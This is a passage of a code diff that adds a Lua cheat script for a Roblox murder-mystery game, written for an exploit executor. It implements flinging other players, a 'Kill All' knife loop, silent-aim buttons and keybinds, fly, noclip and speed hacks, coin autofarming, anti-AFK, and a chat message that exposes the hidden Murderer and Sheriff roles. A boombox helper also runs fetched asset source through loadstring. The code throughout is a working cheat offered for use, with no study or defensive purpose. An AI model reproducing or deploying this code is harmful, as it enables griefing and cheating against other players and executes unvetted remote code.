+        Camera.CameraSubject = oldSubject\
+    else\
+        Camera.CameraSubject = hum\
+    end\
+    if getgenv().OldPos then\
+        local attempts = 0\
+        repeat\
+            root.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)\
+            char:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))\
+            hum:ChangeState(Enum.HumanoidStateType.GettingUp)\
+            task.wait()\
+            attempts = attempts + 1\
+        until (root.Position - getgenv().OldPos.p).Magnitude < 25 or attempts > 50\
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH or -500\
+    end\
+    hum.PlatformStand = false\
+    hum:ChangeState(Enum.HumanoidStateType.Running)\
+    task.wait(0.1)\
+    hum.WalkSpeed = _G.WalkSpeed or 16\
+end\
+local function flingRole(role)\
+    local pl = getTargetByRole(role)\
+    if pl then\
+        FlingActive = true\
+        task.spawn(function()\
+            flingPlayer(pl)\
+            FlingActive = false\
+        end)\
+    else\
+        Notify(\"Error\", \"No \" .. role .. \" found\", \"Error\", nil, 2)\
+    end\
+end\
+local extremeFlingThread = nil\
+local extremeFlingActive = false\
+local function extremeFlingLoop()\
+    local lp = LocalPlayer\
+    local movel = 0.1\
+    while extremeFlingActive do\
+        RunService.Heartbeat:Wait()\
+        local char = lp.Character\
+        local hrp = char and char:FindFirstChild(\"HumanoidRootPart\")\
+        if hrp then\
+            local vel = hrp.Velocity\
+            hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)\
+            RunService.RenderStepped:Wait()\
+            if hrp then\
+                hrp.Velocity = vel\
+            end\
+            RunService.Stepped:Wait()\
+            if hrp then\
+                hrp.Velocity = vel + Vector3.new(0, movel, 0)\
+                movel = -movel\
+            end\
+        end\
+    end\
+end\
+local function toggleExtremeFling(state)\
+    extremeFlingActive = state\
+    if state then\
+        if extremeFlingThread then\
+            coroutine.close(extremeFlingThread)\
+            extremeFlingThread = nil\
+        end\
+        extremeFlingThread = coroutine.create(extremeFlingLoop)\
+        coroutine.resume(extremeFlingThread)\
+        Notify(\"Extreme Fling\", \"ON\", \"Success\", nil, 2)\
+    else\
+        extremeFlingActive = false\
+        if extremeFlingThread then\
+            coroutine.close(extremeFlingThread)\
+            extremeFlingThread = nil\
+        end\
+        local char = LocalPlayer.Character\
+        if char then\
+            local hrp = char:FindFirstChild(\"HumanoidRootPart\")\
+            if hrp then\
+                hrp.Velocity = Vector3.zero\
+                hrp.RotVelocity = Vector3.zero\
+            end\
+        end\
+        Notify(\"Extreme Fling\", \"OFF\", \"Info\", nil, 2)\
+    end\
+end\
+local spectateEnabled = false\
+local spectateDropdown = nil\
+local function updateSpectateList()\
+    if spectateDropdown then\
+        local names = getPlayersNames()\
+        spectateDropdown:SetValues(names)\
+        spectateDropdown:SetValue(nil)\
+        Notify(\"Spectate\", \"Player list refreshed\", \"Info\", nil, 2)\
+    end\
+end\
+local function startSpectate(playerName)\
+    if not spectateEnabled then\
+        Notify(\"Spectate\", \"Enable Spectate first!\", \"Warning\", nil, 2)\
+        return\
+    end\
+    if not playerName or playerName == \"\" then\
+        Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+        Notify(\"Spectate\", \"Stopped\", \"Info\", nil, 2)\
+        return\
+    end\
+    local pl = Players:FindFirstChild(playerName)\
+    if pl and pl.Character and pl.Character:FindFirstChildOfClass(\"Humanoid\") then\
+        Camera.CameraSubject = pl.Character:FindFirstChildOfClass(\"Humanoid\")\
+        Notify(\"Spectate\", \"Now spectating: \" .. pl.Name, \"Info\", nil, 2)\
+    else\
+        Notify(\"Spectate\", \"Player not found or no character\", \"Error\", nil, 2)\
+    end\
+end\
+local ctrlClickTP = false\
+UserInputService.InputBegan:Connect(function(input, gp)\
+    if gp then return end\
+    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) and input.UserInputType == Enum.UserInputType.MouseButton1 and ctrlClickTP then\
+        local mouse = LocalPlayer:GetMouse()\
+        if not mouse then return end\
+        local unitRay = Camera:ScreenPointToRay(mouse.X, mouse.Y)\
+        local ray = Ray.new(unitRay.Origin, unitRay.Direction * 1000)\
+        local hit, pos = workspace:FindPartOnRay(ray, LocalPlayer.Character)\
+        if hit and pos then\
+            LocalPlayer.Character:MoveTo(pos)\
+            Notify(\"Teleport\", \"Teleported to \" .. tostring(pos), \"Info\", nil, 2)\
+        end\
+    end\
+end)\
+local timerLabel = nil\
+local timerTask = nil\
+local function toggleRoundTimer(v)\
+    _G.RoundTimer = v\
+    if v then\
+        timerLabel = Instance.new(\"TextLabel\")\
+        timerLabel.Parent = CoreGui\
+        timerLabel.BackgroundTransparency = 1\
+        timerLabel.TextColor3 = Color3.fromRGB(255,255,255)\
+        timerLabel.TextScaled = true\
+        timerLabel.AnchorPoint = Vector2.new(0.5, 0.5)\
+        timerLabel.Position = UDim2.fromScale(0.5, 0.15)\
+        timerLabel.Size = UDim2.fromOffset(200, 50)\
+        timerLabel.Font = Enum.Font.GothamBold\
+        timerLabel.Text = \"Round Timer: --\"\
+        timerTask = task.spawn(function()\
+            while _G.RoundTimer do\
+                pcall(function()\
+                    local timerRemote = ReplicatedStorage:FindFirstChild(\"Remotes\") and ReplicatedStorage.Remotes:FindFirstChild(\"Extras\") and ReplicatedStorage.Remotes.Extras:FindFirstChild(\"GetTimer\")\
+                    if timerRemote then\
+                        local timeLeft = timerRemote:InvokeServer()\
+                        if timeLeft and timeLeft ~= -1 then\
+                            local minutes = math.floor(timeLeft / 60)\
+                            local seconds = timeLeft % 60\
+                            timerLabel.Text = string.format(\"Round Timer: %02d:%02d\", minutes, seconds)\
+                        else\
+                            timerLabel.Text = \"Round Timer: --\"\
+                        end\
+                    end\
+                end)\
+                task.wait(0.5)\
+            end\
+        end)\
+    else\
+        if timerLabel then timerLabel:Destroy() end\
+        if timerTask then task.cancel(timerTask) end\
+    end\
+end\
+local fpsBoostRunning = false\
+local fpsBoostConn = nil\
+local function toggleImproveFPS(v)\
+    _G.ImproveFPS = v\
+    if v then\
+        if not fpsBoostRunning then\
+            fpsBoostRunning = true\
+            pcall(function()\
+                local Terrain = workspace:FindFirstChildOfClass('Terrain')\
+                if Terrain then\
+                    Terrain.WaterWaveSize = 0\
+                    Terrain.WaterWaveSpeed = 0\
+                    Terrain.WaterReflectance = 0\
+                    Terrain.WaterTransparency = 0\
+                end\
+                game.Lighting.GlobalShadows = false\
+                game.Lighting.FogEnd = 9e9\
+                settings().Rendering.QualityLevel = 1\
+                for _, v in ipairs(workspace:GetDescendants()) do\
+                    if v:IsA(\"Part\") or v:IsA(\"UnionOperation\") or v:IsA(\"MeshPart\") or v:IsA(\"CornerWedgePart\") or v:IsA(\"TrussPart\") then\
+                        v.Material = Enum.Material.Plastic\
+                        v.Reflectance = 0\
+                    elseif v:IsA(\"Decal\") then\
+                        v.Transparency = 1\
+                    elseif v:IsA(\"ParticleEmitter\") or v:IsA(\"Trail\") then\
+                        v.Lifetime = NumberRange.new(0)\
+                    elseif v:IsA(\"Explosion\") then\
+                        v.BlastPressure = 1\
+                        v.BlastRadius = 1\
+                    end\
+                end\
+                for _, v in ipairs(game.Lighting:GetDescendants()) do\
+                    if v:IsA(\"BlurEffect\") or v:IsA(\"SunRaysEffect\") or v:IsA(\"ColorCorrectionEffect\") or v:IsA(\"BloomEffect\") or v:IsA(\"DepthOfFieldEffect\") then\
+                        v.Enabled = false\
+                    end\
+                end\
+                if fpsBoostConn then fpsBoostConn:Disconnect() end\
+                fpsBoostConn = workspace.DescendantAdded:Connect(function(child)\
+                    if child:IsA('ForceField') or child:IsA('Sparkles') or child:IsA('Smoke') or child:IsA('Fire') then\
+                        task.wait(0.1)\
+                        child:Destroy()\
+                    end\
+                end)\
+            end)\
+            Notify(\"FPS Boost\", \"Enabled\", \"Success\", nil, 3)\
+        end\
+    else\
+        fpsBoostRunning = false\
+        if fpsBoostConn then\
+            fpsBoostConn:Disconnect()\
+            fpsBoostConn = nil\
+        end\
+        Notify(\"FPS Boost\", \"Disabled\", \"Info\", nil, 2)\
+    end\
+end\
+local function toggleRTX(v)\
+    _G.RTXShaders = v\
+    local Lighting = game:GetService(\"Lighting\")\
+    if v then\
+        local bloom = Instance.new(\"BloomEffect\", Lighting) bloom.Name = \"RTX_Bloom\" bloom.Intensity = 0.1 bloom.Size = 100\
+        local cc = Instance.new(\"ColorCorrectionEffect\", Lighting) cc.Name = \"RTX_CC\" cc.Saturation = 0.05 cc.TintColor = Color3.fromRGB(255, 224, 219)\
+        local sun = Instance.new(\"SunRaysEffect\", Lighting) sun.Name = \"RTX_SunRays\" sun.Intensity = 0.05\
+        Lighting.Brightness = 2.14; Lighting.ColorShift_Bottom = Color3.fromRGB(11,0,20); Lighting.ColorShift_Top = Color3.fromRGB(240,127,14); Lighting.OutdoorAmbient = Color3.fromRGB(34,0,49); Lighting.ClockTime = 6.7\
+        Notify(\"RTX Shaders\", \"Enabled\", \"Success\", nil, 3)\
+    else\
+        for _, child in ipairs(Lighting:GetChildren()) do if child.Name:find(\"RTX\") then child:Destroy() end end\
+        Lighting.Brightness = 2; Lighting.ColorShift_Bottom = Color3.new(0,0,0); Lighting.ColorShift_Top = Color3.new(0,0,0); Lighting.OutdoorAmbient = Color3.fromRGB(157,157,157); Lighting.ClockTime = 14\
+    end\
+end\
+local korbloxConn\
+local function toggleKorblox(v)\
+    _G.KorbloxEnabled = v\
+    if v then\
+        if korbloxConn then korbloxConn:Disconnect() end\
+        korbloxConn = RunService.Heartbeat:Connect(function()\
+            local char = LocalPlayer.Character\
+            if char then\
+                for _, pname in ipairs({\"RightLowerLeg\", \"RightUpperLeg\", \"RightFoot\"}) do\
+                    local part = char:FindFirstChild(pname)\
+                    if part then\
+                        if pname == \"RightLowerLeg\" then\
+                            part.MeshId = \"http://www.roblox.com/asset/?id=902942093\"\
+                            part.Transparency = 1\
+                        elseif pname == \"RightUpperLeg\" then\
+                            part.MeshId = \"http://www.roblox.com/asset/?id=902942096\"\
+                            part.TextureID = \"http://www.roblox.com/asset/?id=902843398\"\
+                        elseif pname == \"RightFoot\" then\
+                            part.MeshId = \"http://www.roblox.com/asset/?id=902942089\"\
+                            part.Transparency = 1\
+                        end\
+                    end\
+                end\
+            end\
+        end)\
+    else\
+        if korbloxConn then\
+            korbloxConn:Disconnect()\
+            korbloxConn = nil\
+        end\
+    end\
+end\
+local headlessConn\
+local function toggleHeadless(v)\
+    _G.HeadlessEnabled = v\
+    if v then\
+        if headlessConn then headlessConn:Disconnect() end\
+        headlessConn = RunService.Heartbeat:Connect(function()\
+            local char = LocalPlayer.Character\
+            if char then\
+                local head = char:FindFirstChild(\"Head\")\
+                if head then\
+                    head.MeshId = \"http://www.roblox.com/asset/?id=6686307858\"\
+                    head.TextureID = \"http://www.roblox.com/asset/?id=6686307858\"\
+                    head.Transparency = 1\
+                end\
+            end\
+        end)\
+    else\
+        if headlessConn then\
+            headlessConn:Disconnect()\
+            headlessConn = nil\
+        end\
+    end\
+end\
+local function giveBoombox()\
+    local bp = LocalPlayer:WaitForChild(\"Backpack\", 5)\
+    if not bp then\
+        Notify(\"Error\", \"No backpack\", \"Error\", nil, 2)\
+        return\
+    end\
+    if bp:FindFirstChild(\"Boombox\") then\
+        Notify(\"Error\", \"Already have\", \"Error\", nil, 2)\
+        return\
+    end\
+    local boombox = game:GetObjects(\"rbxassetid://740618400\")[1]\
+    if not boombox then\
+        Notify(\"Error\", \"Failed to load\", \"Error\", nil, 2)\
+        return\
+    end\
+    boombox.Parent = bp\
+    pcall(function()\
+        loadstring(boombox.Client.Source)()\
+        loadstring(boombox.Server.Source)()\
+    end)\
+    Notify(\"Boombox\", \"Added to backpack\", \"Success\", nil, 3)\
+end\
+local prankBombConnection\
+local function placePrankBomb()\
+    local char = LocalPlayer.Character\
+    if not char or not char:FindFirstChild(\"HumanoidRootPart\") then return end\
+    local template = ReplicatedStorage:FindFirstChild(\"PrankBomb\")\
+    if not template then\
+        Notify(\"Error\", \"No template\", \"Error\", nil, 2)\
+        return\
+    end\
+    local bomb = template:Clone()\
+    bomb.Parent = workspace\
+    bomb:PivotTo(char.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0))\
+end\
+local function togglePrankBombKeybind(key)\
+    if prankBombConnection then\
+        prankBombConnection:Disconnect()\
+    end\
+    if key and key ~= \"NONE\" and _G.PrankBombEnabled then\
+        prankBombConnection = UserInputService.InputBegan:Connect(function(input, gp)\
+            if gp then return end\
+            if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[key] then\
+                placePrankBomb()\
+            end\
+        end)\
+    end\
+end\
+local function onPrankBombToggle(v)\
+    _G.PrankBombEnabled = v\
+    saveSettings()\
+    togglePrankBombKeybind(_G.PrankBombKey)\
+end\
+local function playEmote(name)\
+    if PlayEmoteEvent then\
+        pcall(function() PlayEmoteEvent:Fire(name) end)\
+    else\
+        Notify(\"Error\", \"Emote remote not found\", \"Error\", nil, 2)\
+    end\
+end\
+local mobileShootBtn = nil\
+local function createMobileButton()\
+    if mobileShootBtn then return end\
+    local gui = Instance.new(\"ScreenGui\")\
+    gui.Name = \"SilentAimMobileBtn\"\
+    gui.Parent = LocalPlayer.PlayerGui\
+    gui.ResetOnSpawn = false\
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\
+    gui.DisplayOrder = 100\
+    local btn = Instance.new(\"TextButton\")\
+    btn.Name = \"ShootButton\"\
+    btn.Size = isMobile and UDim2.fromOffset(80, 80) or UDim2.fromOffset(100, 100)\
+    btn.Position = isMobile and UDim2.new(1, -100, 0.5, -40) or UDim2.new(1, -120, 0.5, -50)\
+    btn.BackgroundColor3 = Color3.fromRGB(220, 40, 40)\
+    btn.Text = \"Silent\\nAim\"\
+    btn.Font = Enum.Font.SourceSansBold\
+    btn.TextColor3 = Color3.new(1, 1, 1)\
+    btn.TextSize = isMobile and 14 or 18\
+    btn.TextWrapped = true\
+    btn.BorderSizePixel = 0\
+    btn.ZIndex = 10\
+    btn.Active = true\
+    btn.Visible = true\
+    Instance.new(\"UICorner\", btn).CornerRadius = UDim.new(0.2, 0)\
+    btn.Parent = gui\
+    btn.MouseButton1Click:Connect(function()\
+        silentAimShoot()\
+    end)\
+    mobileShootBtn = gui\
+end\
+local function removeMobileButton()\
+    if mobileShootBtn then\
+        mobileShootBtn:Destroy()\
+        mobileShootBtn = nil\
+    end\
+end\
+local mobileKnifeBtn = nil\
+local function createMobileKnifeButton()\
+    if mobileKnifeBtn then return end\
+    local gui = Instance.new(\"ScreenGui\")\
+    gui.Name = \"MobileKnifeBtn\"\
+    gui.Parent = LocalPlayer.PlayerGui\
+    gui.ResetOnSpawn = false\
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\
+    gui.DisplayOrder = 100\
+    local btn = Instance.new(\"TextButton\")\
+    btn.Name = \"KnifeButton\"\
+    btn.Size = isMobile and UDim2.fromOffset(80, 80) or UDim2.fromOffset(100, 100)\
+    btn.Position = isMobile and UDim2.new(1, -100, 0.5, -110) or UDim2.new(1, -120, 0.5, -130)\
+    btn.BackgroundColor3 = Color3.fromRGB(220, 40, 40) \
+    btn.Text = \"Knife\\nAim\"\
+    btn.Font = Enum.Font.SourceSansBold\
+    btn.TextColor3 = Color3.new(1, 1, 1)\
+    btn.TextSize = isMobile and 14 or 18\
+    btn.TextWrapped = true\
+    btn.BorderSizePixel = 0\
+    btn.ZIndex = 10\
+    btn.Active = true\
+    btn.Visible = true\
+    Instance.new(\"UICorner\", btn).CornerRadius = UDim.new(0.2, 0)\
+    btn.Parent = gui\
+    btn.MouseButton1Click:Connect(function()\
+        knifeSilentAim() \
+    end)\
+    mobileKnifeBtn = gui\
+end\
+local function removeMobileKnifeButton()\
+    if mobileKnifeBtn then\
+        mobileKnifeBtn:Destroy()\
+        mobileKnifeBtn = nil\
+    end\
+end\
+local pcKeybindConnection\
+local function setupPCKeybind()\
+    if pcKeybindConnection then pcKeybindConnection:Disconnect() end\
+    local key = _G.SilentAimKey\
+    if type(key) ~= \"string\" then key = \"E\" _G.SilentAimKey = key end\
+    if _G.SilentAimEnabled and key ~= \"NONE\" then\
+        local code = Enum.KeyCode[key] if not code then code = Enum.KeyCode.E _G.SilentAimKey = \"E\" end\
+        pcKeybindConnection = UserInputService.InputBegan:Connect(function(input, gp)\
+            if gp then return end\
+            if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == code then\
+                silentAimShoot()\
+            end\
+        end)\
+    end\
+end\
+local function killAll()\
+    if killAllActive then killAllActive = false Notify(\"Kill All\", \"Stopped\", \"Info\", nil, 2) return end\
+    local char = LocalPlayer.Character\
+    local knife = char and (char:FindFirstChild(\"Knife\") or (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild(\"Knife\")))\
+    if not knife then Notify(\"Error\", \"No knife\", \"Error\", nil, 2) return end\
+    killAllActive = true Notify(\"Kill All\", \"Running\", \"Info\", nil, 3)\
+    task.spawn(function()\
+        while killAllActive do\
+            local found = false\
+            for _, pl in ipairs(Players:GetPlayers()) do\
+                if pl ~= LocalPlayer and pl.Character and not isWhitelisted(pl) then\
+                    local hum = pl.Character:FindFirstChildOfClass(\"Humanoid\")\
+                    local tr = pl.Character:FindFirstChild(\"HumanoidRootPart\")\
+                    if hum and hum.Health > 0 and tr then\
+                        found = true\
+                        local myRoot = char:FindFirstChild(\"HumanoidRootPart\")\
+                        local myHum = char:FindFirstChildOfClass(\"Humanoid\")\
+                        if not myRoot or not myHum or myHum.Health <= 0 then\
+                            killAllActive = false\
+                            break\
+                        end\
+                        knife = char:FindFirstChild(\"Knife\") or (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild(\"Knife\"))\
+                        if knife and knife.Parent ~= char then\
+                            myHum:EquipTool(knife)\
+                            task.wait(0.1)\
+                        end\
+                        local st = tick()\
+                        repeat\
+                            if not killAllActive or not tr.Parent or hum.Health <= 0 then break end\
+                            myRoot.CFrame = tr.CFrame * CFrame.new(0,0,1.5)\
+                            if knife and knife.Parent == char then knife:Activate() end\
+                            task.wait()\
+                        until hum.Health <= 0 or tick() - st > 3\
+                    end\
+                end\
+            end\
+            if not found then killAllActive = false Notify(\"Kill All\", \"Done\", \"Success\", nil, 3) break end\
+            task.wait(0.1)\
+        end\
+        killAllActive = false\
+    end)\
+end\
+local function trapPlayer(selectedPlayer)\
+    if not selectedPlayer or not selectedPlayer.Character then return end\
+    local trap = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(\"Trap\")\
+    if not trap then return end\
+    local activate = trap:FindFirstChild(\"Activate\")\
+    if activate then\
+        activate:FireServer(selectedPlayer.Character.HumanoidRootPart.CFrame)\
+    end\
+end\
+local function updateMovement()\
+    local char = LocalPlayer.Character\
+    local hum = char and char:FindFirstChildOfClass(\"Humanoid\")\
+    if not hum or hum.Health <= 0 then return end\
+    local inAir = hum:GetState() == Enum.HumanoidStateType.Freefall or hum:GetState() == Enum.HumanoidStateType.Jumping\
+    hum.WalkSpeed = (_G.SpeedGlitchEnabled and inAir) and _G.GlitchSpeed or _G.WalkSpeed\
+    hum.JumpPower = _G.JumpPower\
+    hum.UseJumpPower = true\
+end\
+local flyConnection\
+local function toggleFly(v)\
+    _G.FlyEnabled = v\
+    local char = LocalPlayer.Character\
+    local root = char and char:FindFirstChild(\"HumanoidRootPart\")\
+    if not root then return end\
+    if v then\
+        local bv = Instance.new(\"BodyVelocity\")\
+        bv.Velocity = Vector3.zero\
+        bv.MaxForce = Vector3.new(9e9,9e9,9e9)\
+        bv.Parent = root\
+        local bg = Instance.new(\"BodyGyro\")\
+        bg.MaxTorque = Vector3.new(9e9,9e9,9e9)\
+        bg.CFrame = Camera.CFrame\
+        bg.Parent = root\
+        flyConnection = RunService.RenderStepped:Connect(function()\
+            if not _G.FlyEnabled then return end\
+            local cam = Camera\
+            bg.CFrame = cam.CFrame\
+            local vel = Vector3.zero\
+            if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel += cam.CFrame.LookVector end\
+            if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel -= cam.CFrame.LookVector end\
+            if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel -= cam.CFrame.RightVector end\
+            if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel += cam.CFrame.RightVector end\
+            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then vel += Vector3.new(0,1,0) end\
+            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then vel -= Vector3.new(0,1,0) end\
+            bv.Velocity = vel * _G.FlySpeed\
+        end)\
+    else\
+        if flyConnection then flyConnection:Disconnect() end\
+        if root:FindFirstChild(\"BodyVelocity\") then root.BodyVelocity:Destroy() end\
+        if root:FindFirstChild(\"BodyGyro\") then root.BodyGyro:Destroy() end\
+    end\
+end\
+local noclipConnection\
+local function toggleNoclip(v)\
+    _G.NoclipEnabled = v\
+    if v then\
+        noclipConnection = RunService.Stepped:Connect(function()\
+            if LocalPlayer.Character then\
+                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do\
+                    if part:IsA(\"BasePart\") then\
+                        part.CanCollide = false\
+                    end\
+                end\
+            end\
+        end)\
+    else\
+        if noclipConnection then noclipConnection:Disconnect() end\
+    end\
+end\
+local antiAfkConnection\
+local function toggleAntiAfk(v)\
+    _G.AntiAfkEnabled = v\
+    if v then\
+        antiAfkConnection = Players.LocalPlayer.Idled:Connect(function()\
+            VirtualUser:CaptureController()\
+            VirtualUser:ClickButton2(Vector2.new())\
+        end)\
+    else\
+        if antiAfkConnection then antiAfkConnection:Disconnect() end\
+    end\
+end\
+local function easyGlitchSetup(v)\
+    _G.EasyGlitch = v\
+    if not v then return end\
+    local spamThreshold = 1\
+    local teleportDistance = 1.2\
+    local wallDistance = 0.4\
+    local lastEquip = 0\
+    local lastTool = nil\
+    local function checkWall()\
+        local char = LocalPlayer.Character\
+        if not char or not char:FindFirstChild(\"HumanoidRootPart\") then return false end\
+        local hrp = char.HumanoidRootPart\
+        local look = hrp.CFrame.LookVector * Vector3.new(1,0,1)\
+        local ray = workspace:Raycast(hrp.Position, look.Unit * wallDistance)\
+        return ray ~= nil\
+    end\
+    local function teleportForward()\
+        local char = LocalPlayer.Character\
+        if not char or not char:FindFirstChild(\"HumanoidRootPart\") then return end\
+        local hrp = char.HumanoidRootPart\
+        hrp.Position += hrp.CFrame.LookVector * Vector3.new(1,0,1).Unit * teleportDistance\
+    end\
+    local function onToolEquipped(tool)\
+        if not _G.EasyGlitch then return end\
+        local now = tick()\
+        if lastTool == tool and (now - lastEquip) < spamThreshold then\
+            if checkWall() then teleportForward() end\
+        end\
+        lastEquip = now\
+        lastTool = tool\
+    end\
+    local function setup(char)\
+        for _, tool in ipairs(char:GetChildren()) do\
+            if tool:IsA(\"Tool\") then\
+                tool.Equipped:Connect(function() onToolEquipped(tool) end)\
+            end\
+        end\
+        local backpack = LocalPlayer:WaitForChild(\"Backpack\")\
+        for _, tool in ipairs(backpack:GetChildren()) do\
+            if tool:IsA(\"Tool\") then\
+                tool.Equipped:Connect(function() onToolEquipped(tool) end)\
+            end\
+        end\
+        backpack.ChildAdded:Connect(function(tool)\
+            if tool:IsA(\"Tool\") then\
+                tool.Equipped:Connect(function() onToolEquipped(tool) end)\
+            end\
+        end)\
+        char.ChildAdded:Connect(function(child)\
+            if child:IsA(\"Tool\") then\
+                child.Equipped:Connect(function() onToolEquipped(child) end)\
+            end\
+        end)\
+    end\
+    if LocalPlayer.Character then setup(LocalPlayer.Character) end\
+    LocalPlayer.CharacterAdded:Connect(setup)\
+end\
+local function layDown()\
+    local char = LocalPlayer.Character\
+    local hum = char and char:FindFirstChildOfClass(\"Humanoid\")\
+    if hum then\
+        hum.Sit = true\
+        task.wait(0.1)\
+        local root = hum.RootPart or char:FindFirstChild(\"HumanoidRootPart\")\
+        if root then\
+            root.CFrame = root.CFrame * CFrame.Angles(math.pi*0.5, 0, 0)\
+        end\
+        for _, anim in ipairs(hum:GetPlayingAnimationTracks()) do\
+            anim:Stop()\
+        end\
+    end\
+end\
+local function sitDown()\
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+    if hum then hum.Sit = true end\
+end\
+local coinFarmThread = nil\
+local function startCoinFarm()\
+    if coinFarmThread then return end\
+    _G.CoinFarmEnabled = true\
+    coinFarmThread = task.spawn(function()\
+        while _G.CoinFarmEnabled do\
+            if not inRound or isDead then task.wait(1) continue end\
+            local char = LocalPlayer.Character if not char then task.wait(1) continue end\
+            local hrp = char:FindFirstChild(\"HumanoidRootPart\")\
+            local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+            if not hrp or not hum or hum.Health <= 0 then isDead = true task.wait(1) continue end\
+            local nearest, nearestDist = nil, math.huge\
+            for _, obj in ipairs(workspace:GetDescendants()) do\
+                if obj:IsA(\"BasePart\") and (obj.Name == \"Coin_Server\" or obj.Name == \"BeachBall\") and obj:FindFirstChild(\"TouchInterest\") then\
+                    local dist = (obj.Position - hrp.Position).Magnitude\
+                    if dist < nearestDist then nearestDist = dist nearest = obj end\
+                end\
+            end\
+            if nearest then\
+                local tween = TweenService:Create(hrp, TweenInfo.new(0.5 / _G.CoinFarmSpeed, Enum.EasingStyle.Linear), {CFrame = nearest.CFrame})\
+                tween:Play()\
+                tween.Completed:Wait()\
+                task.wait(0.1)\
+            else\
+                task.wait(1)\
+            end\
+        end\
+        coinFarmThread = nil\
+    end)\
+end\
+local function stopCoinFarm()\
+    _G.CoinFarmEnabled = false\
+    if coinFarmThread then task.cancel(coinFarmThread) coinFarmThread = nil end\
+end\
+local function toggleCoinFarm(v)\
+    if v then startCoinFarm() else stopCoinFarm() end\
+end\
+local function rejoin()\
+    game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)\
+end\
+local function respawn()\
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass(\"Humanoid\")\
+    if hum then hum.Health = 0 end\
+end\
+local function teleportToSpawn()\
+    local char = LocalPlayer.Character\
+    if not char or not char:FindFirstChild(\"HumanoidRootPart\") then return end\
+    local hrp = char.HumanoidRootPart\
+    local spawns = {}\
+    for _, obj in ipairs(workspace:GetDescendants()) do\
+        if obj.Name == \"Spawn\" or obj.Name == \"PlayerSpawn\" then\
+            if obj:IsA(\"BasePart\") then\
+                table.insert(spawns, obj)\
+            end\
+        end\
+    end\
+    if #spawns > 0 then\
+        hrp.CFrame = spawns[1].CFrame * CFrame.new(0, 2.5, 0)\
+    else\
+        Notify(\"Teleport\", \"No spawn found\", \"Error\", nil, 2)\
+    end\
+end\
+local function sendRoleNames()\
+    local murderer = getTargetByRole(\"Murderer\")\
+    local sheriff = getTargetByRole(\"Sheriff\")\
+    local msg = \"Murderer: \" .. (murderer and murderer.Name or \"None\") .. \" | Sheriff: \" .. (sheriff and sheriff.Name or \"None\")\
+    local chatService = game:GetService(\"TextChatService\")\
+    local channels = chatService:FindFirstChild(\"TextChannels\")\
+    if channels then\
+        for _, ch in ipairs(channels:GetChildren()) do\
+            if ch:IsA(\"TextChannel\") and ch.Name ~= \"RBXSystem\" then\
+                pcall(function() ch:SendAsync(msg) end)\
+            end\
+        end\
+    else\
+        Notify(\"Error\", \"No chat channels\", \"Error\", nil, 2)\
+    end\
+end\
+do\
+    local dropkickPower = 50\
+    local runSpeedPercent = 20\
+    local BASE_WALKSPEED = 16\
+    local dropkickBusy = false\
+    local dropkickActive = false\
+    local runActive = false\
+    local dropkickTrack = nil\
+    local runTrack = nil\
+    local runAnimConnection = nil\
+    local EMOTE_ID = \"rbxassetid://133566007754001\"\
+    local RUN_ANIM_ID = \"rbxassetid://70636286183373\"\
+    local dropkickEnabled = false\
+    local runEnabled = false\
+    local mobileDropkickBtn = nil\
+    local mobileRunBtn = nil\
+    local mobileGui = nil\
+    local function getHumanoid()\
+        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()\
+        return char:WaitForChild(\"Humanoid\", 5)\
+    end\
+    local function playDropkickEmote()\
+        local hum = getHumanoid()\
+        if not hum then return end\
+        local anim = Instance.new(\"Animation\")\
+        anim.AnimationId = EMOTE_ID\
+        dropkickTrack = hum:LoadAnimation(anim)\
+        dropkickTrack.Priority = Enum.AnimationPriority.Action\
+        dropkickTrack.Looped = false\
+        dropkickTrack:Play()\
+    end\
+    local function startDropkickFling()\
+        dropkickActive = true\
+        task.spawn(function()\
+            while dropkickActive do\
+                RunService.Heartbeat:Wait()\
+                local char = LocalPlayer.Character\
+                local hrp = char and char:FindFirstChild(\"HumanoidRootPart\")\
+                if hrp then\
+                    local vel = hrp.Velocity\
+                    hrp.Velocity = vel * dropkickPower + Vector3.new(0, 0, dropkickPower)\
+                    RunService.RenderStepped:Wait()\
+                    if hrp then hrp.Velocity = vel end\
+                    RunService.Stepped:Wait()\
+                    if hrp then hrp.Velocity = vel + Vector3.new(0, 0.1, 0) end\
+                end\
+            end\
+        end)\
+    end\
+    local function stopDropkickFling()\
+        dropkickActive = false\
+    end\
+    local function activateDropkick()\
+        if not dropkickEnabled then\
+            Notify(\"Dropkick\", \"Enable in menu first!\", \"Warning\", nil, 2)\
+            return\
+        end\
+        if dropkickBusy then return end\
+        dropkickBusy = true\
+        if runTrack then runTrack:Stop() end\
+        playDropkickEmote()\
+        startDropkickFling()\
+        task.delay(2, function()\
+            stopDropkickFling()\
+            if dropkickTrack then dropkickTrack:Stop(); dropkickTrack = nil end\
+        end)\
+        task.spawn(function()\
+            for i = 3, 1, -1 do\
+                Notify(\"Dropkick\", \"Wait \" .. i, \"Info\", nil, 1)\
+                task.wait(1)\
+            end\
+            dropkickBusy = false\
